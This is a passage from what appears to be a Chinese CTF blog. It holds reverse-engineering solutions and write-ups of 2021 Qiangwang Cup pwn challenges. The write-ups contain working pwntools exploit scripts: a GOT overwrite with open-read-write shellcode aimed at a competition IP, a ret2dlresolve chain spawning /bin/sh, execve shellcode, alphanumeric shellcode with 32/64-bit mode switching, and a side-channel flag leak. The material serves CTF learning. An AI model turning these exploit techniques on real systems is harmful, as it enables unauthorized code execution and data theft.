&#x27;/&#x27; + file print (position) z = zipfile.ZipFile(position, &#x27;r&#x27;) for filename in z.namelist(): bytes = z.read(filename) if b&#x27;Zmxh&#x27; in bytes: print(filename) print(bytes[0:100]) break 1234567./zipBomb/ZT.ZIP./zipBomb/ZG5.ZIP./zipBomb/YNDAK.ZIP./zipBomb/XS.ZIP./zipBomb/X9D.ZIPC1b&#x27;ZmxhZ3tGIW5EX0ZsNGdfMW5fMklQXzEzT01CfQ==\\xa6\\xff\\xe9\\x00\\xdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27; 获得base64编码的flag，解码后： 1flag&#123;F!nD_Fl4g_1n_2IP_13OMB&#125; reea5ycpp 使用IDA反编译函数，发现关键函数，要求数组v5要和v14完全相等： 12345678910for ( i = 0; i &lt;= 23; ++i )&#123; v5 = sub_3920(v11); if ( *(_BYTE *)(v5 + i) != v14[i] ) &#123; v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;You are wrong&quot;); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); goto LABEL_9; &#125;&#125; 出题程序逻辑还是比较简单的，我们截取一部分来分析： 可以看到首先初始化了变量v12，这里的a2和v18只是因为栈参数传递的原因，所以被IDA认为是函数参数。 接着判断v12的长度是否为24，也就是告诉我们flag的长度为24。 初始化v13为brianfuck的密文，并再sub_3876函数中将地址赋值给v11变量的+264位置。 回收v13变量，调用brainfuck解密函数sub_3936，将结果保存在v11变量的+i位置。 12345678910111213141516std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v12, a2, v18);std::operator&gt;&gt;&lt;char&gt;(&amp;std::cin, v12);std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v13, v12);sub_38A8(v3, v13);std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v13);if ( std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::size(v12) == 24 )&#123; std::allocator&lt;char&gt;::allocator(&amp;v9); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string( v13, &quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;, &amp;v9); sub_3876(v11, (__int64)v13); std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v13); std::allocator&lt;char&gt;::~allocator(&amp;v9); sub_3936(v11); 选择编辑 -&gt; 导出数据，选择raw bytes，并导出成文件： 使用Brainfuck Visualizer解密： 也可以使用远程动态调试，当我们输入000000000000000000000000后，发现数组v12的值逐渐变大，这让我们猜测属于变式凯撒加密（注意这个数组v12因为非指针类型的缘故无法直接跳转，这里我们发现它处于右下角的栈空间中，所以右键点击follow in disassemble或者synchronsize with -&gt; Hex View-1就可以看到数组了： 发现数组也是从偏移2开始的，和之前的推测一样。 写出解密脚本： 123cipher = [0x68, 0x6F, 0x65, 0x6C, 0x81, 0x69, 0x7A, 0x3D, 0x3B, 0x79, 0x6B, 0x73, 0x38, 0x39, 0x7B, 0x70, 0x7B, 0x48, 0x73, 0x7C, 0x85, 0x47, 0x7C, 0x96]for i in range(len(cipher)): print(chr(cipher[i] - i - 2), end = &#x27;&#x27;) 1flag&#123;br41n_f**k_i5_go0d&#125; easy_math 打开IDA反编译程序，发现main函数解析不了，通过关键字符串定位函数： 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122int __cdecl main_0(int argc, const char **argv, const char **envp)&#123; int v3; // eax int v5; // [esp+10h] [ebp-214h] char v6[36]; // [esp+28h] [ebp-1FCh] BYREF int v7; // [esp+88h] [ebp-19Ch] int v8; // [esp+154h] [ebp-D0h] int v9; // [esp+158h] [ebp-CCh] int *v10; // [esp+164h] [ebp-C0h] int *v11; // [esp+170h] [ebp-B4h] char *v12; // [esp+17Ch] [ebp-A8h] char v13[24]; // [esp+188h] [ebp-9Ch] BYREF __int64 v14; // [esp+1A0h] [ebp-84h] __int64 v15; // [esp+1B0h] [ebp-74h] __int64 v16; // [esp+1C0h] [ebp-64h] __int64 v17; // [esp+1D0h] [ebp-54h] __int64 v18; // [esp+1E0h] [ebp-44h] char v19[16]; // [esp+1F0h] [ebp-34h] BYREF char v20[20]; // [esp+200h] [ebp-24h] BYREF int v21; // [esp+220h] [ebp-4h] __CheckForDebuggerJustMyCode(&amp;unk_434032); sub_411FA5(0x10u); sub_4121D5(v20); v21 = 0; v3 = sub_41257C(std::cout, &quot;Input:&quot;); std::ostream::operator&lt;&lt;(v3, sub_412572); do &#123; v7 = std::istream::operator&gt;&gt;(std::cin, v19); if ( !(unsigned __int8)std::ios_base::operator bool(*(_DWORD *)(*(_DWORD *)v7 + 4) + v7) ) break; sub_4121B7(v19); &#125; while ( sub_411F28(v20) != 5 ); v18 = *(_QWORD *)sub_411F4B(1); v17 = *(_QWORD *)sub_411F4B(2); v16 = *(_QWORD *)sub_411F4B(3); v15 = *(_QWORD *)sub_411F4B(4) - 0x666C616755i64; v14 = sub_41218F(v15, HIDWORD(v15)); if ( sub_411F28(v20) == 5 ) &#123; if ( v18 - v14 == 0x61536369217Di64 ) &#123; if ( v17 - v14 == 0x586531316Fi64 ) &#123; if ( v16 - v14 == 0x5F3631626F4Ei64 ) &#123; if ( v14 + v16 + v17 + v18 == 0xC121F9FCC23Ai64 ) &#123; puts(&quot;You are right!&quot;); sub_4121FD(v20); sub_4122ED(0x10u); sub_4122D9(v13); LOBYTE(v21) = 1; v12 = v20; v11 = (int *)sub_412392(v20); v10 = (int *)sub_41226B(v20); while ( v11 != v10 ) &#123; v8 = *v11; v9 = v11[1]; v5 = sub_412423(v6, v8, v9); LOBYTE(v21) = 2; sub_4123B0(v5); LOBYTE(v21) = 1; sub_4123AB(v6); v11 += 2; &#125; puts(&quot;Now decode the res!&quot;); sub_412581(); LOBYTE(v21) = 0; sub_412333(v13); v21 = -1; sub_411F5F(v20); return 0; &#125; else &#123; puts(&quot;arrsum wrong!&quot;); sub_412581(); v21 = -1; sub_411F5F(v20); return 0; &#125; &#125; else &#123; puts(&quot;arr3 wrong!&quot;); sub_412581(); v21 = -1; sub_411F5F(v20); return 0; &#125; &#125; else &#123; puts(&quot;arr2 wrong!&quot;); sub_412581(); v21 = -1; sub_411F5F(v20); return 0; &#125; &#125; else &#123; puts(&quot;arr1 wrong!&quot;); sub_412581(); v21 = -1; sub_411F5F(v20); return 0; &#125; &#125; else &#123; puts(&quot;arr wrong!&quot;); sub_412581(); v21 = -1; sub_411F5F(v20); return 0; &#125;&#125; 明显是解方程组，使用z3： 123456789101112131415161718from z3 import *import libnumflag = [Int(&#x27;v%d&#x27; % i) for i in [14, 16, 17, 18, 19]]s = Solver()s.add(flag[3] - flag[0] == 0x61536369217D)s.add(flag[2] - flag[0] == 0x586531316F)s.add(flag[1] - flag[0] == 0x5F3631626F4E)s.add(flag[0] + flag[1] + flag[2] + flag[3] == 0xC121F9FCC23A)s.add(flag[4] - flag[0] == 0x666C616755)if s.check() == sat: m = s.model() res = b&#x27;&#x27; for i in [4, 2, 1, 3]: res += libnum.n2s(int(str(m[flag[i]]))) print(res) 1vlagUhe11o_F1boNacci!&#125; 实际上还有一步对变量v14的操作，是v14 = sub_41218F(v15, HIDWORD(v15));。不过这里已经看出flag了，就不再调试了： 1flag&#123;he11o_F1boNacci!&#125; pig_brain_king 参考链接：https://www.cnblogs.com/holittech/articles/15335676.html 这是一个游戏的题目，需要回答正确1000道题目才能拿到flag，由于程序比较长，我们分段来解析这个程序： 首先是在字典中取值，并打印出来， 不能看出这就是题目的输出： 1234567891011121314151617181920212223242526272829303132333435strcpy(v283, &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;?!_&quot;); v282 = 3; sub_961154(v266, v269); v284 = 0; v259 = v283[67]; v252 = v283[66]; v246 = v283[32]; v239 = v283[39]; v232 = v283[34]; v228 = v283[36]; v219 = v283[39]; v214 = v283[34]; v210 = v283[26]; v207 = v283[43]; v203 = v283[27]; v198 = v283[32]; v196 = v283[34]; v193 = v283[41]; v188 = v283[45]; v185 = v283[44]; v182 = v283[30]; v181 = v283[32]; v178 = v283[39]; v175 = v283[40]; v172 = v283[43]; v169 = v283[45]; v167 = v283[44]; v163 = v283[30]; v160 = v283[33]; v158 = v283[45]; v155 = v283[44]; v154 = v283[34]; v151 = v283[40]; v149 = v283[33]; v3 = sub_96121C(std::cout, v283[22]); 打印的值为（修改为小端序）： 123456table = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;?!_&quot;array = [67, 66, 32, 39, 34, 36, 39, 34, 26, 43, 27, 32, 34, 41, 45, 44, 30, 32, 39, 40, 43, 45, 44, 30, 33, 45, 44, 34, 40, 33]res = &#x27;&#x27;for i in array: res += table[i]print(res[::-1]) 1234567whoisthestrongestpigbrainking?!canyouanswer1000questionscorrectly?nowstartdoingthequestions!pleaseenternononobingo!theansweris 找到theansweris： 123456789101112131415161718192021222324252627282930else &#123; v265 = v283[44]; v258 = v283[34]; v245 = v283[43]; v238 = v283[30]; v231 = v283[48]; v227 = v283[44]; v223 = v283[39]; v218 = v283[26]; v209 = v283[30]; v206 = v283[33]; v134 = sub_96121C(std::cout, v283[19]); v135 = sub_96121C(v134, v206); v136 = sub_96121C(v135, v209); v137 = sub_961474(v136, &quot; &quot;); v138 = sub_96121C(v137, v218); v139 = sub_96121C(v138, v223); v140 = sub_96121C(v139, v227); v141 = sub_96121C(v140, v231); v142 = sub_96121C(v141, v238); v143 = sub_96121C(v142, v245); v144 = sub_961474(v143, &quot; &quot;); v145 = sub_96121C(v144, v258); v146 = sub_96121C(v145, v265); sub_961474(v146, &quot;:&quot;); sub_9614BF(v267, v270); &#125; Sleep(0xBB8u); system(&quot;cls&quot;); system(&quot;cls&quot;);是系统清屏函数，定位到关键函数sub_9614BF(v267, v270);： 123456789101112131415__CheckForDebuggerJustMyCode(&amp;unk_97F035);GetConsoleScreenBufferInfo(*((HANDLE *)v90 + 64), &amp;ConsoleScreenBufferInfo);*((_WORD *)v90 + 136) = ConsoleScreenBufferInfo.dwCursorPosition.X;*((_WORD *)v90 + 137) = ConsoleScreenBufferInfo.dwCursorPosition.Y;if ( *((double *)v90 + 33) &gt; 3330.0 )&#123; sub_9610AA(&amp;unk_978DD6); v91 = 0; sub_961442(v88); v91 = -1; sub_961528(); v85 = *((_BYTE *)v90 + 249); v84 = *((_BYTE *)v90 + 251); v83 = *((_BYTE *)v90 + 223); ... 发现这里存在一个if判断，猜测这里就是判断打印flag的函数。 回到主函数我们发现在上方还存在一个sub_9614BF(v267, v270);函数，判断是否能够打印flag，且之前打印的字符串为owstartdoingthequestions!。意思就是在游戏开始时也会判断一次。 使用IDA动调，在sub_9614BF(v267, v270);函数内部if语句之前下断点： 运行到断点处后，双击修改EIP的值为if语句后第一个push的指令地址0x0086CB81，按F9继续运行，就可以得到flag。 1flag&#123;Y0U_ar3_The_k1ng_0f_pig_bra1n!&#125;","categories":[],"tags":[]},{"title":"2021强网杯pwn复现","slug":"2021强网杯pwn复现","date":"2021-10-08T16:55:04.000Z","updated":"2021-10-08T17:37:50.398Z","comments":true,"path":"2021/10/09/2021强网杯pwn复现/","link":"","permalink":"http://example.com/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/","excerpt":"2021强网杯pwn 参考链接：https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/ [强网先锋]orw 查看程序，基本全是7的权限，所以说shellcode往哪里写都可以：","text":"2021强网杯pwn 参考链接：https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/ [强网先锋]orw 查看程序，基本全是7的权限，所以说shellcode往哪里写都可以： 12345678secc@ubuntu:~/Desktop$ checksec pwn[*] &#x27;/home/secc/Desktop/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 临时修改共享库可以使用如下命令： 1export LD_PRELOAD=/home/secc/Desktop/libseccomp.so.0 查看沙盒，发现限制了只能使用open、read、write函数，这道题应该是个orw： 123456789101112131415161718192021222324secc@ubuntu:~/Desktop$ seccomp-tools dump ./pwn..#######..##......##.########..##.....##.##..##..##.##.....##.##.....##.##..##..##.##.....##.##.....##.##..##..##.########..##..##.##.##..##..##.##.....##.##....##..##..##..##.##.....##..#####.##..###..###..########.It&#x27;s easy .Just hack for fun~! line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL 反编译程序，是一道菜单题，只有add和free两个函数。首先来看看函数，这里没有限制索引为负数： 12345678910111213141516171819202122232425__int64 sub_E44()&#123; int v1; // [rsp+0h] [rbp-10h] int v2; // [rsp+4h] [rbp-Ch] if ( qword_202130 &lt;= 1 ) &#123; puts(&quot;index:&quot;); v1 = sub_DFA(); puts(&quot;size:&quot;); v2 = sub_DFA(); if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 8 &amp;&amp; v1 &lt;= 1 ) // 只限制了索引小于1，存在数组越界 &#123; qword_2020E0[v1] = malloc(v2); if ( !qword_2020E0[v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;content:&quot;); sub_D8E(qword_2020E0[v1], v2); ++qword_202130; &#125; &#125; return qword_202130; free函数比较正常： 12345678910111213141516__int64 sub_F8E()&#123; __int64 result; // rax int v1; // [rsp+Ch] [rbp-14h] result = qword_202138; if ( qword_202138 &lt;= 0 ) &#123; puts(&quot;index:&quot;); v1 = sub_DFA(); free((void *)qword_2020E0[v1]); qword_2020E0[v1] = 0LL; return ++qword_202138; &#125; return result;&#125; myread函数，存在任意长度写： 12345678910111213141516171819__int64 __fastcall sub_D8E(_BYTE *a1, __int64 a2)&#123; _BYTE *buf; // [rsp+8h] [rbp-18h] unsigned int v4; // [rsp+14h] [rbp-Ch] buf = a1; v4 = 0; while ( 1 ) &#123; read(0, buf, 1uLL); // 首先读入一个字节，让v4加1，此时v4已经等于1了 ++v4; if ( *buf == 10 ) break; if ( ++buf == &amp;a1[a2] ) return v4; // 如果伪造v4为0的话，这里的判断永远不会成立，所以存在任意长度写 &#125; *buf = 0; return v4;&#125; 思路： 使用负索引，可以修改got表。 往got表的libc地址内写入shellcode，最后触发执行。 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)sh = process(&#x27;./orw&#x27;)sh = remote(&#x27;39.105.131.68&#x27;,12354)elf = ELF(&#x27;./orw&#x27;)libc = elf.libcshellcode=&#x27;&#x27;&#x27;xor rsi, rsimov rax, 2mov rdi, 0x67616c662fpush rdimov rdi, rspsyscallmov rdx, 0x100mov rsi, rdimov rdi, raxxor rax, raxsyscallmov rdi, 1mov rax, 1syscall&#x27;&#x27;&#x27;sh.recv()sh.sendline(&#x27;1&#x27;)sh.recvuntil(&#x27;index:&#x27;)sh.sendline(&#x27;-25&#x27;)# gdb.attach(sh, &#x27;init-pwndbg\\nb *$rebase(0x0000E90)&#x27;)sh.recvuntil(&#x27;size:&#x27;)sh.sendline(&#x27;&#x27;) # 填0也可以sh.recvuntil(&#x27;content:&#x27;)sh.sendline(asm(shellcode))sh.recv()sh.sendline(&#x27;4&#x27;)sh.recv()sh.sendline(&#x27;1&#x27;)sh.interactive() 另一种思路： 改写atoi为jmp rdi，这样就可以利用atoi的缓冲区写入shellcode。 通过16字节的shellcode写入更大的shellcode，完成orw。且可以后一个shellcode可以读入栈中，使用rbp寄存器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)sh = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = elf.libcdef choice(cho): sh.sendlineafter(&#x27;choice &gt;&gt;&#x27;, str(cho))def add(idx, size, content): choice(1) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.sendlineafter(&#x27;size&#x27;, str(size)) sh.sendlineafter(&#x27;content&#x27;, content)def free(idx): choice(4) sh.sendlineafter(&#x27;index&#x27;, str(idx))shellcode = asm(&#x27;&#x27;&#x27;xor rax, raxmov dl, 0x80mov rsi, rbppush raxpop rdisyscalljmp rbp&#x27;&#x27;&#x27;)print(len(shellcode))add(0, 8, &#x27;flag&#x27;)free(0)pause()add(-14, 8, asm(&#x27;jmp rdi&#x27;)) # atoish.sendline(shellcode)shellcode = shellcraft.pushstr(&#x27;/flag&#x27;)shellcode += shellcraft.open(&#x27;rsp&#x27;)shellcode += shellcraft.read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 100)shellcode += shellcraft.write(1, &#x27;rsp&#x27;, 100)sh.send(asm(shellcode))sh.interactive() [强网先锋]no_output 使用IDA反编译程序： 123456789101112131415161718192021int sub_8049424()&#123; int result; // eax char src[32]; // [esp+Ch] [ebp-5Ch] BYREF char buf[48]; // [esp+2Ch] [ebp-3Ch] BYREF const char *v3; // [esp+5Ch] [ebp-Ch] sub_804930B(); v3 = &quot;tell me some thing&quot;; read(0, buf, 0x30u); v3 = &quot;Tell me your name:\\n&quot;; read(0, src, 0x20u); sub_80493EC(src); strcpy(dest, src); v3 = &quot;now give you the flag\\n&quot;; read(unk_804C080, src, 0x10u); // 读取本地文件中的字符串 result = sub_8049385(src, off_804C034); // 字符串比较，off_804C034为hello_boy if ( !result ) return sub_8049269(); // 比较成功后进入函数 return result;&#125; 看一下sub_804930B初始化函数： 1234567891011int sub_804930B()&#123; int result; // eax setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); result = open(&quot;real_flag.txt&quot;, 1); unk_804C080 = result; return result;&#125; 来看到sub_8049269函数： 1234567891011121314151617181920__sighandler_t sub_8049269()&#123; __sighandler_t result; // eax void (*v1)(int); // [esp+0h] [ebp-18h] BYREF int v2[2]; // [esp+4h] [ebp-14h] BYREF const char *v3; // [esp+Ch] [ebp-Ch] v3 = &quot;give me the soul:&quot;; __isoc99_scanf(&quot;%d&quot;, v2); v3 = &quot;give me the egg:&quot;; __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 ) &#123; signal(8, (__sighandler_t)sub_8049236); // set handler，SIGFPE表示一个算数运算异常 v2[1] = v2[0] / (int)v1; // sub_8049236为漏洞函数 return signal(8, 0); &#125; return result;&#125; 学习一下signal函数： 1sighandler_t signal(int signum, sighandler_t handler); 参数signum指明了所要处理的信号类型，它可以取除了SIGKILL和SIGSTOP外的任何一种信号。 题目中SIGFPE即常量8，为数学相关的异常，如被0除，浮点溢出，等等。 看到sub_8049236漏洞函数，这里就是简单的栈溢出了： 123456ssize_t sub_8049236()&#123; char buf[68]; // [esp+0h] [ebp-48h] BYREF return read(0, buf, 0x100u);&#125; 思路： 由于存在strcpy(dest, src);该函数存在1位的溢出，会在拷贝的最后一位后加上\\x00，且刚好看到读入的fd指针就在dest全局变量的后面。那么我们可以通过这一位的溢出，将fd指针修改为\\x00，那么read函数也就变成了读入输入的字符，那么我们就可以控制src了。 触发算数运算异常才能运行后门函数，但是if (v1)限制了v1不能为0，那么我们就来构造溢出，我们输入比-2147483648更小的数，由于scanf函数的特性，最终都是识别成0x80000000。输入v1为-1，$-2147483648\\div-1=2147483648$，但是2147483648超出了符号int数的大小范围，会导致算数运算异常。 sub_8049236函数内是简单的堆溢出，由于本题中没有输出，所以使用dl_runtime_resolve攻击。 形成脚本（ret2dlresolve的思路大致理清楚了，后面再学）： 注意read函数取消输入不仅可以通过换行字符，也可以通过时间停滞。 123456789101112131415161718192021222324from pwn import *context(log_level = &#x27;debug&#x27;, endian = &#x27;little&#x27;, arch = &#x27;i386&#x27;)sh = process(&#x27;./test&#x27;)elf = ELF(&#x27;./test&#x27;)sh.send(&#x27;\\x00&#x27;)sleep(0.1) # raw_input(&#x27;&gt;&#x27;)sh.send(&#x27;a&#x27; * 0x20)sleep(0.1)sh.send(&#x27;hello_boy\\x00&#x27;)sh.sendline(str(-0x80000000))sh.sendline(str(-1))rop = ROP(&quot;./test&quot;)dlresolve = Ret2dlresolvePayload(elf, symbol = &#x27;system&#x27;, args=[&#x27;/bin/sh&#x27;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump())sh.sendline(fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;))sh.interactive() [强网先锋]shellcode 参考链接：https://www.cnblogs.com/countfatcode/p/11756258.htmlhttps://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/https://lingze.xyz/pages/07df2e/ 查看沙盒： 123456789101112secc@ubuntu:~/Desktop$ seccomp-tools dump ./shellcode line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x06 0x00 0x00000005 if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025 if (A == alarm) goto 0008 0003: 0x15 0x03 0x00 0x00000004 if (A == stat) goto 0007 0004: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000 return KILL 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW IDA反编译程序，查看主函数，主程序是入读shellcode并执行： 12345678910111213141516171819 v0 = sys_alarm(0x3Cu); v1 = sys_prctl(38, 1uLL, 0LL, 0LL); v3 = sys_prctl(22, 2uLL, (unsigned __int64)arg3, v2); v4 = (char *)sys_mmap(0LL, 0x1000uLL, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL); v5 = sys_read(0, v4, 0x1000uLL); v6 = v5; if ( v4[(int)v5 - 1] == 10 ) &#123; v4[(int)v5 - 1] = 0; v6 = v5 - 1; &#125; for ( i = 0; i &lt; v6; ++i ) &#123; if ( v4[i] &lt;= 31 || v4[i] == 127 ) // 限制读入的字符为可见字符串 goto LABEL_10; &#125; ((void (*)(void))v4)(); // 调用shellcodeLABEL_10: v8 = sys_exit_group(0); retfq指令的栈布局为： ret（位于sp）：接下来要执行的地址。 set cs（位于sp+4/8）：切换到64位系统下，参数值为0x33；切换到32位系统下，参数值为0x23。 需要的注意的是，在由64位变为32位后，rsp的值会变成非法值，故需先修复rsp的值在执行相应的代码（即mov esp, 0x40404550）。 shellcode 编写一个测试程序如下，并使用gcc main.c -z execstack -o main命令编译，编译为32位需加上-m32： 1234567#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; execve(&quot;/bin/sh&quot;, 0, 0); return 0; &#125; 使用objdump打印出intel架构下的main函数，发现直接调用了链接库函数，这种方法行不通。 1234567891011secc@ubuntu:~/Desktop$ objdump -M intel -d a.out | grep &#x27;&lt;main&gt;&#x27; -A 100000000000400430 &lt;main&gt;: 400430: 48 83 ec 08 sub rsp,0x8 400434: 31 d2 xor edx,edx 400436: 31 f6 xor esi,esi 400438: bf d4 05 40 00 mov edi,0x4005d4 40043d: e8 ce ff ff ff call 400410 &lt;execve@plt&gt; 400442: 31 c0 xor eax,eax 400444: 48 83 c4 08 add rsp,0x8 400448: c3 ret 400449: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] gdb反汇编execve函数的代码： 1234567pwndbg&gt; disassemble execveDump of assembler code for function execve: 0x00007ffff78937f0 &lt;+0&gt;: mov eax,0x3b 0x00007ffff78937f5 &lt;+5&gt;: syscall 0x00007ffff78937f7 &lt;+7&gt;: cmp rax,0xfffffffffffff001 0x00007ffff78937fd &lt;+13&gt;: jae 0x7ffff7893800 &lt;execve+16&gt; 0x00007ffff78937ff &lt;+15&gt;: ret 仿照上面写出代码（将字符串/bin/sh\\x00压栈之后，又把栈地址赋值给rdi）： 1234567mov rdx, 0mov rsi, 0mov rdi, 0x68732f6e69622f push rdimov rdi, rspmov eax, 0x3bsyscall 优化选项（长度为0xc）： 12345678910mov al, 59push rbxpush rbxpop rsipop rdxmov rdi, 0x68732f6e69622fpush rdipush rsppop rdisyscall 继续题解 查看32位和64位的系统调用号：https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md 系统调用号 x86 x64 5 open fstat 37 kill alarm 4 write stat 0 restart_syscall read 9 link mmap 231 fgetxattr exit_group mmap调用 的shellcode： 12345678910111213141516171819202122232425262728293031323334353637383940code_mmap = asm(&#x27;&#x27;&#x27; /*mov rdi, 0x40404040*/ push 0x40404040 pop rdi /*mov rsi, 0x7e*/ push 0x7e pop rsi /*mov rdx, 0x7*/ push 0x37 pop rax xor al, 0x30 push rax pop rdx /*mov r8, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop r8 /*mov r9, 0*/ push rax pop r9 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x2c], cl push 0x5c pop rcx xor byte ptr [rbx+0x2d], cl /*mov rax, 0x9*/ push 0x39 pop rax xor al, 0x30&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) read调用的shellcode： 1234567891011121314151617181920212223242526272829code_read = asm(&#x27;&#x27;&#x27; /*mov rsi, 0x40404040*/ push 0x40404040 pop rsi /*mov rdi, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop rdi /*mov rdx, 0x7e*/ push 0x7e pop rdx /*mov rax, 0*/ push 0x30 pop rax xor al, 0x30 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x4f], cl push 0x5c pop rcx xor byte ptr [rbx+0x50], cl&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) retfq指令的shellcode： 1234567891011121314151617181920212223code_retfq = asm(&#x27;&#x27;&#x27; /* 算出0x48 */ push 0x39 pop rcx xor byte ptr [rbx + 0x71], cl push 0x20 pop rcx xor byte ptr [rbx + 0x71], cl /* * 利用无借位减法算出0xcb */ push 0x47 pop rcx sub byte ptr [rbx + 0x72], cl sub byte ptr [rbx + 0x72], cl push rdi push rdi push 0x23 push 0x40404040 pop rax push rax&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) open调用的shellcode（32位下）： 1234567891011code_open = asm(&#x27;&#x27;&#x27; /* open函数 */ mov esp, 0x40404550 push 0x67616c66 /* flag */ mov ebx, esp xor ecx, ecx xor edx, edx mov eax, 0x5 int 0x80 mov ecx, eax&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) retfq从32位转回64位的shellcode： 123456code_retfq_1 = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x33 push 0x40404062 /* 具体数字有待修改 */ retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) read的shellcode（64位下）： 1234567code_read = asm(&#x27;&#x27;&#x27; mov rdi,rcx mov rsi,rsp mov rdx,0x70 xor rax,rax syscall&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) append的shelllcode（64位下）： 1234code_append = asm(&#x27;&#x27;&#x27; push rcx pop rcx&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) append的shelllcode（32位下）： 1234code_append_x86 = asm(&#x27;&#x27;&#x27; push ebx pop ebx&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) 侧信道攻击： 1234if index == 0: shellcode_flag += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(index, ch)else: shellcode_flag += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(index, ch) 最后形成脚本（注意自己调用read的时候是不需要使用可见字符的shellcode的）： 